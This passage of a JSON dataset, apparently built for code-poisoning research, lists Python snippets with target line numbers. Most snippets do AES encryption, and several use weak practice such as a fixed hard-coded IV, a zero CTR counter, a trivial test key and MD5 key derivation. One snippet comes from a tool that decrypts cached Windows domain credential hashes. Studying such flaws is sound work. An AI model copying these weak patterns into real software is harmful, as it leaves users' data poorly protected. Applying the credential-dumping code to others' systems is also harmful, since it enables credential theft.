      "        raise CorruptedPassword(\"Can not decrypt password. Check the key\")\n",
      "    else:\n",
      "        return plaintext\n",
      "\n",
      "\n",
      "def encrypt_db_charfield(plaintext):\n",
      "    if not plaintext:\n",
      "        return plaintext\n",
      "    salt = \"\".join([choice(letters + digits) for i in xrange(SALT_LEN)])\n"
    ],
    "target": 35,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/dimara/synnefo/snf-cyclades-app/synnefo/db/migrations/0066_add_iv.py",
    "code": [
      "# encoding: utf-8\n",
      "import datetime\n",
      "from south.db import db\n",
      "from south.v2 import DataMigration\n",
      "from django.db import models\n",
      "from binascii import b2a_base64, a2b_base64\n",
      "from Crypto.Cipher import AES\n",
      "from Crypto import Random\n",
      "from random import choice\n",
      "from string import letters, digits\n",
      "from synnefo.settings import SECRET_ENCRYPTION_KEY\n",
      "\n",
      "DB_ENCRYPTED_FIELD_PREFIX = 'encrypted'\n",
      "SALT_LEN = 8\n",
      "\n",
      "\n",
      "def _pad_secret(secret, blocksize=32, padding='}'):\n",
      "    len_secret = len(secret)\n",
      "    if len_secret > 32:\n",
      "        raise ValueError('Encryption key must be smaller than 32 bytes')\n",
      "    if not len_secret in (16, 24, 32):\n",
      "        return secret + (blocksize - len(secret)) * padding\n",
      "    return secret\n",
      "\n",
      "\n",
      "def encrypt(s, iv=None):\n",
      "    if iv is None:\n",
      "        obj = AES.new(_pad_secret(SECRET_ENCRYPTION_KEY), AES.MODE_CFB)\n",
      "    else:\n",
      "        obj = AES.new(_pad_secret(SECRET_ENCRYPTION_KEY), AES.MODE_CFB, iv)\n",
      "    return obj.encrypt(s)\n",
      "\n",
      "\n",
      "def decrypt(s, iv=None):\n",
      "    if iv is None:\n",
      "        obj = AES.new(_pad_secret(SECRET_ENCRYPTION_KEY), AES.MODE_CFB)\n",
      "    else:\n",
      "        obj = AES.new(_pad_secret(SECRET_ENCRYPTION_KEY), AES.MODE_CFB, iv)\n",
      "    return obj.decrypt(s)\n",
      "\n",
      "\n",
      "def encrypt_db_charfield_old(plaintext):\n",
      "    if not plaintext:\n",
      "        return plaintext\n",
      "    salt = \"\".join([choice(letters + digits) for i in xrange(SALT_LEN)])\n",
      "\n",
      "    plaintext = \"%s%s\" % (salt, plaintext)\n",
      "    # Encrypt and convert to binary\n",
      "    ciphertext = b2a_base64(encrypt(plaintext))\n",
      "    # Append prefix,salt and return encoded value\n",
      "    final = '%s:%s$%s' % (DB_ENCRYPTED_FIELD_PREFIX, salt, ciphertext)\n",
      "    return final.encode('utf8')\n",
      "\n",
      "\n",
      "def decrypt_db_charfield_old(ciphertext):\n",
      "    if not ciphertext:\n",
      "        return ciphertext\n",
      "    has_prefix = ciphertext.startswith(DB_ENCRYPTED_FIELD_PREFIX + ':')\n",
      "    if not has_prefix:  # Non-encoded value\n",
      "        return ciphertext\n",
      "    else:\n",
      "        _, ciphertext = ciphertext.split(':')\n",
      "\n",
      "    pure_salt, encrypted = ciphertext.split('$')\n",
      "\n",
      "    plaintext = decrypt(a2b_base64(encrypted))\n",
      "\n",
      "    salt = plaintext[:SALT_LEN]\n",
      "    plaintext = plaintext[SALT_LEN:]\n",
      "\n",
      "    if salt != pure_salt:\n",
      "        # Can not decrtypt password\n",
      "        raise CorruptedPassword(\"Can not decrypt password. Check the key\")\n",
      "    else:\n",
      "        return plaintext\n",
      "\n",
      "\n",
      "def encrypt_db_charfield(plaintext):\n",
      "    if not plaintext:\n",
      "        return plaintext\n",
      "    salt = \"\".join([choice(letters + digits) for i in xrange(SALT_LEN)])\n"
    ],
    "target": 37,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/titilambert/teeawards/old/beaker/crypto/pycrypto.py",
    "code": [
      "\"\"\"Encryption module that uses pycryptopp or pycrypto\"\"\"\n",
      "try:\n",
      "    # Pycryptopp is preferred over Crypto because Crypto has had\n",
      "    # various periods of not being maintained, and pycryptopp uses\n",
      "    # the Crypto++ library which is generally considered the 'gold standard'\n",
      "    # of crypto implementations\n",
      "    from pycryptopp.cipher import aes\n",
      "\n",
      "    def aesEncrypt(data, key):\n",
      "        cipher = aes.AES(key)\n",
      "        return cipher.process(data)\n",
      "\n",
      "    # magic.\n",
      "    aesDecrypt = aesEncrypt\n",
      "\n",
      "except ImportError:\n",
      "    from Crypto.Cipher import AES\n",
      "    from Crypto.Util import Counter\n",
      "\n",
      "    def aesEncrypt(data, key):\n",
      "        cipher = AES.new(key, AES.MODE_CTR,\n",
      "                         counter=Counter.new(128, initial_value=0))\n",
      "\n",
      "        return cipher.encrypt(data)\n",
      "\n",
      "    def aesDecrypt(data, key):\n",
      "        cipher = AES.new(key, AES.MODE_CTR,\n",
      "                         counter=Counter.new(128, initial_value=0))\n",
      "        return cipher.decrypt(data)\n",
      "\n",
      "\n",
      "\n",
      "def getKeyLength():\n",
      "    return 32\n"
    ],
    "target": 20,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/titilambert/teeawards/old/beaker/crypto/pycrypto.py",
    "code": [
      "\"\"\"Encryption module that uses pycryptopp or pycrypto\"\"\"\n",
      "try:\n",
      "    # Pycryptopp is preferred over Crypto because Crypto has had\n",
      "    # various periods of not being maintained, and pycryptopp uses\n",
      "    # the Crypto++ library which is generally considered the 'gold standard'\n",
      "    # of crypto implementations\n",
      "    from pycryptopp.cipher import aes\n",
      "\n",
      "    def aesEncrypt(data, key):\n",
      "        cipher = aes.AES(key)\n",
      "        return cipher.process(data)\n",
      "\n",
      "    # magic.\n",
      "    aesDecrypt = aesEncrypt\n",
      "\n",
      "except ImportError:\n",
      "    from Crypto.Cipher import AES\n",
      "    from Crypto.Util import Counter\n",
      "\n",
      "    def aesEncrypt(data, key):\n",
      "        cipher = AES.new(key, AES.MODE_CTR,\n",
      "                         counter=Counter.new(128, initial_value=0))\n",
      "\n",
      "        return cipher.encrypt(data)\n",
      "\n",
      "    def aesDecrypt(data, key):\n",
      "        cipher = AES.new(key, AES.MODE_CTR,\n",
      "                         counter=Counter.new(128, initial_value=0))\n",
      "        return cipher.decrypt(data)\n",
      "\n",
      "\n",
      "\n",
      "def getKeyLength():\n",
      "    return 32\n"
    ],
    "target": 26,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/Teeed/WHOis-HS-server/application.py",
    "code": [
      "\n",
      "\tdata = ''\n",
      "\twith file(config.get('database', 'leases_file'), 'r') as f:\n",
      "\t\tdata = f.read()\n",
      "\n",
      "\t# matches = re.findall(r'lease ([^\\s]*) {\\n  starts \\d \\d\\d\\d\\d/\\d\\d/\\d\\d \\d\\d:\\d\\d:\\d\\d;\\n  ends \\d \\d\\d\\d\\d/\\d\\d/\\d\\d \\d\\d:\\d\\d:\\d\\d;\\n  cltt \\d \\d\\d\\d\\d/\\d\\d/\\d\\d \\d\\d:\\d\\d:\\d\\d;\\n  binding state active;[\\s\\S]*?hardware ethernet (.{17});', data)\n",
      "\t# return [(ip, mac_to_binary(mac)) for ip, mac in matches]\n",
      "\n",
      "\t# fuck regexp (which actually works well), lets try to parse it manually (in really ugly way!)\n",
      "\tipnow = ''\n",
      "\tmacaddr = ''\n",
      "\tinblock = False\n",
      "\n",
      "\tmatches = set([])\n",
      "\n",
      "\tutcnow = datetime.datetime.utcnow()\n",
      "\n",
      "\tfor line in data.split('\\n'):\n",
      "\t\tline = line.strip()\n",
      "\n",
      "\t\tif not len(line) or line[0] == '#':\n",
      "\t\t\tcontinue\n",
      "\n",
      "\t\tif line.startswith('lease '):\n",
      "\t\t\tipnow = line[6:-2]\n",
      "\t\t\tinblock = True\n",
      "\t\telif inblock:\n",
      "\t\t\tif line[0] == '}':\n",
      "\t\t\t\tmatches.add( (ipnow, macaddr.lower()) )\n",
      "\t\t\t\tinblock = False\n",
      "\t\t\telif line.startswith('binding state free') or (line.startswith('ends') and datetime.datetime.strptime(line[7:-1], \"%Y/%m/%d %H:%M:%S\") < utcnow): # skip entry\n",
      "\t\t\t\tinblock = False\n",
      "\t\t\telif line.startswith('hardware ethernet'):\n",
      "\t\t\t\tmacaddr = line[18:-1]\n",
      "\n",
      "\treturn list(matches)\n",
      "\n",
      "def encrypt_data_for_whois(data):\n",
      "\tdata = json.dumps(data)\n",
      "\n",
      "\tiv = Random.new().read(AES.block_size)\n",
      "\tcipher = AES.new(config.get('whois_master', 'key'), AES.MODE_CFB, iv)\n",
      "\n",
      "\treturn iv + cipher.encrypt(data)\n",
      "\n",
      "def return_data_for_whois(data):\n",
      "\t\tweb.header('Content-Type', 'application/octet-stream')\n",
      "\t\tweb.header('Access-Control-Allow-Origin', '*')\n",
      "\t\tweb.header('Cache-Control', 'no-cache')\n",
      "\n",
      "\t\treturn base64.b64encode(encrypt_data_for_whois(data))\n",
      "\t\n",
      "class index:\n",
      "\tdef GET(self):\n",
      "\t\tusers = get_current_dhcp_leases()\n",
      "\n",
      "\t\treturn return_data_for_whois(users)\n",
      "\n",
      "class register_device:\n",
      "\tdef GET(self, uid, access_key):\n",
      "\t\tuid = int(uid)\n",
      "\n",
      "\t\tuser_ip = web.ctx.env.get('HTTP_X_FORWARDED_FOR', web.ctx.get('ip', ''))\n",
      "\t\tuser_mac = None\n",
      "\t\tdhcp_leases = get_current_dhcp_leases()\n",
      "\n",
      "\t\tfor lease in dhcp_leases:\n",
      "\t\t\tif lease[0] == user_ip:\n",
      "\t\t\t\tuser_mac = lease[1]\n",
      "\n",
      "\t\t\t\tbreak\n",
      "\n",
      "\t\tif not user_mac:\n",
      "\t\t\traise web.badrequest(u'Wlacz pobieranie adresu przez DHCP')\n",
      "\n",
      "\t\tdata = encrypt_data_for_whois( (int(uid), access_key, user_mac) )\n",
      "\n",
      "\t\traise web.seeother('%s/register_device/%s' % (config.get('whois_master', 'url'), base64.urlsafe_b64encode(data)))\n",
      "\n",
      "if __name__ == '__main__':\n",
      "\tapp.run()\n"
    ],
    "target": 41,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/Teeed/WHOis-HS-server/tools/testclient.py",
    "code": [
      "from Crypto.Cipher import AES\n",
      "import urllib\n",
      "import base64\n",
      "import json\n",
      "\n",
      "def get_data_from_server():\n",
      "\tdata = urllib.urlopen('http://127.0.0.1:8080/?appid=1').read()\n",
      "\tbinary_data = base64.b64decode(data)\n",
      "\n",
      "\treturn json.loads(AES.new('aaaaaaaaaaaaaaaa', AES.MODE_CFB, binary_data[:AES.block_size]).decrypt(binary_data[AES.block_size:]))\n",
      "\n",
      "print get_data_from_server()"
    ],
    "target": 9,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/ymorired/s4backup/crypt.py",
    "code": [
      "__author__ = 'mori.yuichiro'\n",
      "\n",
      "from Crypto.Cipher import AES\n",
      "from Crypto import Random\n",
      "import StringIO\n",
      "import binascii\n",
      "\n",
      "\n",
      "class Encryptor():\n",
      "    \"\"\"\n",
      "        PKCS7 compatible encryption / decryption\n",
      "\n",
      "    \"\"\"\n",
      "\n",
      "    def __init__(self, encryption_key, initial_vector):\n",
      "\n",
      "        self.encryption_key = encryption_key\n",
      "        self.initial_vector = initial_vector\n",
      "\n",
      "    @classmethod\n",
      "    def generate_str_keyset(cls, length):\n",
      "        return binascii.b2a_hex(cls.generate_iv()), binascii.b2a_hex(cls.generate_binkey(length))\n",
      "\n",
      "    @classmethod\n",
      "    def generate_iv(cls):\n",
      "        iv = Random.new().read(AES.block_size)\n",
      "        return iv\n",
      "\n",
      "    @classmethod\n",
      "    def generate_binkey(cls, length=1):\n",
      "        key = Random.new().read(AES.block_size * length)\n",
      "        return key\n",
      "\n",
      "    @classmethod\n",
      "    def initialize_by_hex(cls, key_str, iv_str):\n",
      "        return cls(binascii.a2b_hex(key_str), binascii.a2b_hex(iv_str))\n",
      "\n",
      "    def encrypt_file(self, in_file_p, out_file_p):\n",
      "\n",
      "        crypt = AES.new(self.encryption_key, AES.MODE_CBC, self.initial_vector)\n",
      "        # keep chunk size large for speed but divisible by 16B\n",
      "        chunksize = 1024\n",
      "\n",
      "        padded = False\n",
      "        while True:\n",
      "            chunk = in_file_p.read(chunksize)\n",
      "            if len(chunk) == 0 and padded:\n",
      "                # it's an empty chunk. We don't need it.\n",
      "                break\n",
      "            elif len(chunk) == chunksize:\n",
      "                # We've read a full encryptable chunk with length divisible by 16B\n",
      "                out_file_p.write(crypt.encrypt(chunk))\n",
      "            else:\n",
      "                # We've read a chunk that's not divisible by 16B. We PCKS7 pad it.\n",
      "                # First calculate how many bytes we'll need to pad it\n",
      "                padding_bytes = 16 - len(chunk) % AES.block_size\n",
      "                # Next, create the padding sequence\n",
      "                padding = StringIO.StringIO()\n",
      "                for _ in xrange(padding_bytes):\n",
      "                    # If we're missing 4 bytes, the padding sequence would be 04 04 04 04 (hex). That's why the formatting.\n",
      "                    padding.write('%02x' % padding_bytes)\n",
      "                padded_chunk = chunk + binascii.unhexlify(padding.getvalue())\n",
      "                out_file_p.write(crypt.encrypt(padded_chunk))\n",
      "                padded = True\n",
      "\n",
      "    def encrypt_file_by_path(self, in_file, out_file):\n",
      "        with open(in_file, 'rb') as in_file_p, open(out_file, 'wb') as out_file_p:\n",
      "            self.encrypt_file(in_file_p, out_file_p)\n",
      "\n",
      "    def decrypt_file(self, in_file_p, out_file_p):\n",
      "\n",
      "        decryptor = AES.new(self.encryption_key, AES.MODE_CBC, self.initial_vector)\n",
      "        # keep chunk size large for speed but divisible by 16B\n",
      "        chunksize = 1024\n",
      "\n",
      "        decrypted_chunk = ''\n",
      "        while True:\n",
      "            chunk = in_file_p.read(chunksize)\n",
      "            if len(chunk) == 0:\n",
      "                break\n",
      "\n"
    ],
    "target": 39,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/ymorired/s4backup/crypt.py",
    "code": [
      "\n",
      "    \"\"\"\n",
      "\n",
      "    def __init__(self, encryption_key, initial_vector):\n",
      "\n",
      "        self.encryption_key = encryption_key\n",
      "        self.initial_vector = initial_vector\n",
      "\n",
      "    @classmethod\n",
      "    def generate_str_keyset(cls, length):\n",
      "        return binascii.b2a_hex(cls.generate_iv()), binascii.b2a_hex(cls.generate_binkey(length))\n",
      "\n",
      "    @classmethod\n",
      "    def generate_iv(cls):\n",
      "        iv = Random.new().read(AES.block_size)\n",
      "        return iv\n",
      "\n",
      "    @classmethod\n",
      "    def generate_binkey(cls, length=1):\n",
      "        key = Random.new().read(AES.block_size * length)\n",
      "        return key\n",
      "\n",
      "    @classmethod\n",
      "    def initialize_by_hex(cls, key_str, iv_str):\n",
      "        return cls(binascii.a2b_hex(key_str), binascii.a2b_hex(iv_str))\n",
      "\n",
      "    def encrypt_file(self, in_file_p, out_file_p):\n",
      "\n",
      "        crypt = AES.new(self.encryption_key, AES.MODE_CBC, self.initial_vector)\n",
      "        # keep chunk size large for speed but divisible by 16B\n",
      "        chunksize = 1024\n",
      "\n",
      "        padded = False\n",
      "        while True:\n",
      "            chunk = in_file_p.read(chunksize)\n",
      "            if len(chunk) == 0 and padded:\n",
      "                # it's an empty chunk. We don't need it.\n",
      "                break\n",
      "            elif len(chunk) == chunksize:\n",
      "                # We've read a full encryptable chunk with length divisible by 16B\n",
      "                out_file_p.write(crypt.encrypt(chunk))\n",
      "            else:\n",
      "                # We've read a chunk that's not divisible by 16B. We PCKS7 pad it.\n",
      "                # First calculate how many bytes we'll need to pad it\n",
      "                padding_bytes = 16 - len(chunk) % AES.block_size\n",
      "                # Next, create the padding sequence\n",
      "                padding = StringIO.StringIO()\n",
      "                for _ in xrange(padding_bytes):\n",
      "                    # If we're missing 4 bytes, the padding sequence would be 04 04 04 04 (hex). That's why the formatting.\n",
      "                    padding.write('%02x' % padding_bytes)\n",
      "                padded_chunk = chunk + binascii.unhexlify(padding.getvalue())\n",
      "                out_file_p.write(crypt.encrypt(padded_chunk))\n",
      "                padded = True\n",
      "\n",
      "    def encrypt_file_by_path(self, in_file, out_file):\n",
      "        with open(in_file, 'rb') as in_file_p, open(out_file, 'wb') as out_file_p:\n",
      "            self.encrypt_file(in_file_p, out_file_p)\n",
      "\n",
      "    def decrypt_file(self, in_file_p, out_file_p):\n",
      "\n",
      "        decryptor = AES.new(self.encryption_key, AES.MODE_CBC, self.initial_vector)\n",
      "        # keep chunk size large for speed but divisible by 16B\n",
      "        chunksize = 1024\n",
      "\n",
      "        decrypted_chunk = ''\n",
      "        while True:\n",
      "            chunk = in_file_p.read(chunksize)\n",
      "            if len(chunk) == 0:\n",
      "                break\n",
      "\n",
      "            decrypted_chunk = decryptor.decrypt(chunk)\n",
      "            out_file_p.write(decrypted_chunk)\n",
      "\n",
      "        padding = (ord(decrypted_chunk[-1]) % AES.block_size) or AES.block_size\n",
      "        out_file_p.seek(-padding, 2)\n",
      "        out_file_p.truncate()\n",
      "\n",
      "    def decrypt_file_by_path(self, in_file, out_file):\n",
      "        with open(in_file, 'rb') as in_file_p, open(out_file, 'wb') as out_file_p:\n",
      "            self.decrypt_file(in_file_p, out_file_p)\n",
      "\n"
    ],
    "target": 60,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/jamesward/pubnub-api/python-twisted/PubnubCrypto.py",
    "code": [
      "from base64 import encodestring, decodestring \n",
      "import hashlib\n",
      "import hmac\n",
      "\n",
      "class PubnubCrypto() :\n",
      "    \"\"\"\n",
      "    #**\n",
      "    #* PubnubCrypto\n",
      "    #*\n",
      "    #**\n",
      "\n",
      "    ## Initiate Class\n",
      "    pc = PubnubCrypto\n",
      "\n",
      "    \"\"\"\n",
      "   \n",
      "    def pad( self, msg, block_size=16 ):\n",
      "        \"\"\"\n",
      "        #**\n",
      "        #* pad\n",
      "        #*\n",
      "        #* pad the text to be encrypted\n",
      "        #* appends a padding character to the end of the String\n",
      "        #* until the string has block_size length\n",
      "        #* @return msg with padding.\n",
      "        #**\n",
      "        \"\"\"\n",
      "        return msg + ((block_size - len(msg) % block_size) * chr(block_size - len(msg) % block_size))\n",
      "       \n",
      "    def depad( self, msg ):\n",
      "        \"\"\"\n",
      "        #**\n",
      "        #* depad\n",
      "        #*\n",
      "        #* depad the decryptet message\"\n",
      "        #* @return msg without padding.\n",
      "        #**\n",
      "        \"\"\"\n",
      "        return msg[0:-ord(msg[-1])]\n",
      "\n",
      "    def getSecret( self, key ):\n",
      "        \"\"\"\n",
      "        #**\n",
      "        #* getSecret\n",
      "        #*\n",
      "        #* hases the key to MD5\n",
      "        #* @return key in MD5 format\n",
      "        #**\n",
      "        \"\"\"\n",
      "        return MD5.new(key).digest()\n",
      "\n",
      "    def encrypt( self, key, msg ):\n",
      "        \"\"\"\n",
      "        #**\n",
      "        #* encrypt\n",
      "        #*\n",
      "        #* encrypts the message\n",
      "        #* @return message in encrypted format\n",
      "        #**\n",
      "        \"\"\"\n",
      "        secret = self.getSecret(key)\n",
      "        Initial16bytes='0123456789012345'\n",
      "        cipher = AES.new(secret,AES.MODE_CBC,Initial16bytes)\n",
      "        return encodestring(cipher.encrypt(self.pad(msg)))\n",
      "    \n",
      "    def decrypt( self, key, msg ):\n",
      "        \"\"\"\n",
      "        #**\n",
      "        #* decrypt\n",
      "        #*\n",
      "        #* decrypts the message\n",
      "        #* @return message in decryped format\n",
      "        #**\n",
      "        \"\"\"\n",
      "        secret = self.getSecret(key)\n",
      "        Initial16bytes='0123456789012345'\n",
      "        cipher = AES.new(secret,AES.MODE_CBC,Initial16bytes)\n",
      "        return self.depad((cipher.decrypt(decodestring(msg))))\n",
      "    "
    ],
    "target": 61,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/jamesward/pubnub-api/python-twisted/PubnubCrypto.py",
    "code": [
      "from base64 import encodestring, decodestring \n",
      "import hashlib\n",
      "import hmac\n",
      "\n",
      "class PubnubCrypto() :\n",
      "    \"\"\"\n",
      "    #**\n",
      "    #* PubnubCrypto\n",
      "    #*\n",
      "    #**\n",
      "\n",
      "    ## Initiate Class\n",
      "    pc = PubnubCrypto\n",
      "\n",
      "    \"\"\"\n",
      "   \n",
      "    def pad( self, msg, block_size=16 ):\n",
      "        \"\"\"\n",
      "        #**\n",
      "        #* pad\n",
      "        #*\n",
      "        #* pad the text to be encrypted\n",
      "        #* appends a padding character to the end of the String\n",
      "        #* until the string has block_size length\n",
      "        #* @return msg with padding.\n",
      "        #**\n",
      "        \"\"\"\n",
      "        return msg + ((block_size - len(msg) % block_size) * chr(block_size - len(msg) % block_size))\n",
      "       \n",
      "    def depad( self, msg ):\n",
      "        \"\"\"\n",
      "        #**\n",
      "        #* depad\n",
      "        #*\n",
      "        #* depad the decryptet message\"\n",
      "        #* @return msg without padding.\n",
      "        #**\n",
      "        \"\"\"\n",
      "        return msg[0:-ord(msg[-1])]\n",
      "\n",
      "    def getSecret( self, key ):\n",
      "        \"\"\"\n",
      "        #**\n",
      "        #* getSecret\n",
      "        #*\n",
      "        #* hases the key to MD5\n",
      "        #* @return key in MD5 format\n",
      "        #**\n",
      "        \"\"\"\n",
      "        return MD5.new(key).digest()\n",
      "\n",
      "    def encrypt( self, key, msg ):\n",
      "        \"\"\"\n",
      "        #**\n",
      "        #* encrypt\n",
      "        #*\n",
      "        #* encrypts the message\n",
      "        #* @return message in encrypted format\n",
      "        #**\n",
      "        \"\"\"\n",
      "        secret = self.getSecret(key)\n",
      "        Initial16bytes='0123456789012345'\n",
      "        cipher = AES.new(secret,AES.MODE_CBC,Initial16bytes)\n",
      "        return encodestring(cipher.encrypt(self.pad(msg)))\n",
      "    \n",
      "    def decrypt( self, key, msg ):\n",
      "        \"\"\"\n",
      "        #**\n",
      "        #* decrypt\n",
      "        #*\n",
      "        #* decrypts the message\n",
      "        #* @return message in decryped format\n",
      "        #**\n",
      "        \"\"\"\n",
      "        secret = self.getSecret(key)\n",
      "        Initial16bytes='0123456789012345'\n",
      "        cipher = AES.new(secret,AES.MODE_CBC,Initial16bytes)\n",
      "        return self.depad((cipher.decrypt(decodestring(msg))))\n",
      "    "
    ],
    "target": 75,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/EthanBlackburn/sync-engine/migrations/versions/045_new_password_storage.py",
    "code": [
      "\"\"\"Store passwords in plaintext.\n",
      "\n",
      "Revision ID: 7a117720554\n",
      "Revises: 247cd689758c\n",
      "Create Date: 2014-06-30 20:36:30.705550\n",
      "\n",
      "\"\"\"\n",
      "\n",
      "# revision identifiers, used by Alembic.\n",
      "revision = '7a117720554'\n",
      "down_revision = '247cd689758c'\n",
      "\n",
      "import os\n",
      "from alembic import op\n",
      "import sqlalchemy as sa\n",
      "\n",
      "# We're deleting this value from the config, so need to explicitly give it for\n",
      "# this migration.\n",
      "# If you're running this migration and for some reason you had specified a\n",
      "# different key directory, you should change this accordingly.\n",
      "KEY_DIR = '/var/lib/inboxapp/keys'\n",
      "\n",
      "\n",
      "# Copied from deprecated inbox.util.cryptography module.\n",
      "# Needed to port passwords to new storage method.\n",
      "def decrypt_aes(ciphertext, key):\n",
      "    \"\"\"\n",
      "    Decrypts a ciphertext that was AES-encrypted with the given key.\n",
      "    The function expects the ciphertext as a byte string and it returns the\n",
      "    decrypted message as a byte string.\n",
      "    \"\"\"\n",
      "    from Crypto.Cipher import AES\n",
      "    unpad = lambda s: s[:-ord(s[-1])]\n",
      "    iv = ciphertext[:AES.block_size]\n",
      "    cipher = AES.new(key, AES.MODE_CBC, iv)\n",
      "    plaintext = unpad(cipher.decrypt(ciphertext))[AES.block_size:]\n",
      "    return plaintext\n",
      "\n",
      "\n",
      "def upgrade():\n",
      "    from inbox.models.session import session_scope\n",
      "    from inbox.ignition import main_engine\n",
      "    engine = main_engine(pool_size=1, max_overflow=0)\n",
      "    from inbox.util.file import mkdirp\n",
      "    from hashlib import sha256\n",
      "\n",
      "    OriginalBase = sa.ext.declarative.declarative_base()\n",
      "    OriginalBase.metadata.reflect(engine)\n",
      "\n",
      "    if 'easaccount' in OriginalBase.metadata.tables:\n",
      "        op.add_column('easaccount', sa.Column('password', sa.String(256)))\n",
      "\n",
      "        # Reflect again to pick up added column\n",
      "        Base = sa.ext.declarative.declarative_base()\n",
      "        Base.metadata.reflect(engine)\n",
      "\n",
      "        class Account(Base):\n",
      "            __table__ = Base.metadata.tables['account']\n",
      "\n",
      "        class EASAccount(Account):\n",
      "            __table__ = Base.metadata.tables['easaccount']\n",
      "\n",
      "            @property\n",
      "            def _keyfile(self, create_dir=True):\n",
      "                assert self.key\n",
      "\n",
      "                assert KEY_DIR\n",
      "                if create_dir:\n",
      "                    mkdirp(KEY_DIR)\n",
      "                key_filename = '{0}'.format(sha256(self.key).hexdigest())\n",
      "                return os.path.join(KEY_DIR, key_filename)\n",
      "\n",
      "            def get_old_password(self):\n",
      "                if self.password_aes is not None:\n",
      "                    with open(self._keyfile, 'r') as f:\n",
      "                        key = f.read()\n",
      "\n",
      "                    key = self.key + key\n",
      "                    return decrypt_aes(self.password_aes, key)\n",
      "\n",
      "        with session_scope(ignore_soft_deletes=False) as db_session:\n"
    ],
    "target": 34,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/CarlosLannister/OwadeReborn/owade/fileAnalyze/hashcatLib/framework/win32/domcachedump.py",
    "code": [
      "# creddump is distributed in the hope that it will be useful,\n",
      "# but WITHOUT ANY WARRANTY; without even the implied warranty of\n",
      "# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n",
      "# GNU General Public License for more details.\n",
      "#\n",
      "# You should have received a copy of the GNU General Public License\n",
      "# along with creddump.  If not, see <http://www.gnu.org/licenses/>.\n",
      "\n",
      "\"\"\"\n",
      "@author:       Brendan Dolan-Gavitt\n",
      "@license:      GNU General Public License 2.0 or later\n",
      "@contact:      bdolangavitt@wesleyan.edu\n",
      "\"\"\"\n",
      "\n",
      "from struct import unpack\n",
      "\n",
      "from Crypto.Hash import HMAC\n",
      "from Crypto.Cipher import ARC4, AES\n",
      "\n",
      "from owade.fileAnalyze.hashcatLib.framework.win32.rawreg import *\n",
      "from owade.fileAnalyze.hashcatLib.framework.addrspace import HiveFileAddressSpace\n",
      "from owade.fileAnalyze.hashcatLib.framework.win32.hashdump import get_bootkey\n",
      "from owade.fileAnalyze.hashcatLib.framework.win32.lsasecrets import get_secret_by_name,get_lsa_key\n",
      "\n",
      "\n",
      "def get_nlkm(secaddr, lsakey, vista):\n",
      "    return get_secret_by_name(secaddr, 'NL$KM', lsakey, vista)\n",
      "\n",
      "def decrypt_hash(edata, nlkm, ch):\n",
      "    hmac_md5 = HMAC.new(nlkm,ch)\n",
      "    rc4key = hmac_md5.digest()\n",
      "\n",
      "    rc4 = ARC4.new(rc4key)\n",
      "    data = rc4.encrypt(edata)\n",
      "    return data\n",
      "\n",
      "def decrypt_hash_vista(edata, nlkm, ch):\n",
      "    \"\"\"\n",
      "    Based on code from http://lab.mediaservice.net/code/cachedump.rb\n",
      "    \"\"\"\n",
      "    aes = AES.new(nlkm[16:32], AES.MODE_CBC, ch)\n",
      "\n",
      "    out = \"\"\n",
      "    for i in range(0, len(edata), 16):\n",
      "        buf = edata[i : i+16]\n",
      "        if len(buf) < 16:\n",
      "            buf += (16 - len(buf)) * \"\\00\"\n",
      "\n",
      "        out += aes.decrypt(buf)\n",
      "    return out\n",
      "\n",
      "def parse_cache_entry(cache_data):\n",
      "    (uname_len, domain_len) = unpack(\"<HH\", cache_data[:4])\n",
      "    (domain_name_len,) = unpack(\"<H\", cache_data[60:62])\n",
      "    ch = cache_data[64:80]\n",
      "    enc_data = cache_data[96:]\n",
      "    return (uname_len, domain_len, domain_name_len, enc_data, ch) \n",
      "\n",
      "def parse_decrypted_cache(dec_data, uname_len,\n",
      "        domain_len, domain_name_len):\n",
      "    uname_off = 72\n",
      "    pad = 2 * ( ( uname_len / 2 ) % 2 )\n",
      "    domain_off = uname_off + uname_len + pad\n",
      "    pad = 2 * ( ( domain_len / 2 ) % 2 )\n",
      "    domain_name_off = domain_off + domain_len + pad\n",
      "\n",
      "    hash = dec_data[:0x10]\n",
      "    username = dec_data[uname_off:uname_off+uname_len]\n",
      "    username = username.decode('utf-16-le')\n",
      "    domain = dec_data[domain_off:domain_off+domain_len]\n",
      "    domain = domain.decode('utf-16-le')\n",
      "    domain_name = dec_data[domain_name_off:domain_name_off+domain_name_len]\n",
      "    domain_name = domain_name.decode('utf-16-le')\n",
      "\n",
      "    return (username, domain, domain_name, hash)\n",
      "\n",
      "def dump_hashes(sysaddr, secaddr, vista):\n",
      "    bootkey = get_bootkey(sysaddr)\n",
      "    if not bootkey:\n",
      "        return []\n",
      "\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/dmitry-sobolev/ansible/lib/ansible/parsing/vault/__init__.py",
    "code": [
      "            b_d += b_di\n",
      "\n",
      "        b_key = b_d[:key_length]\n",
      "        b_iv = b_d[key_length:key_length+iv_length]\n",
      "\n",
      "        return b_key, b_iv\n",
      "\n",
      "    def encrypt(self, b_plaintext, b_password, key_length=32):\n",
      "\n",
      "        \"\"\" Read plaintext data from in_file and write encrypted to out_file \"\"\"\n",
      "\n",
      "        raise AnsibleError(\"Encryption disabled for deprecated VaultAES class\")\n",
      "\n",
      "    def decrypt(self, b_vaulttext, b_password, key_length=32):\n",
      "\n",
      "        \"\"\" Decrypt the given data and return it\n",
      "        :arg b_data: A byte string containing the encrypted data\n",
      "        :arg b_password: A byte string containing the encryption password\n",
      "        :arg key_length: Length of the key\n",
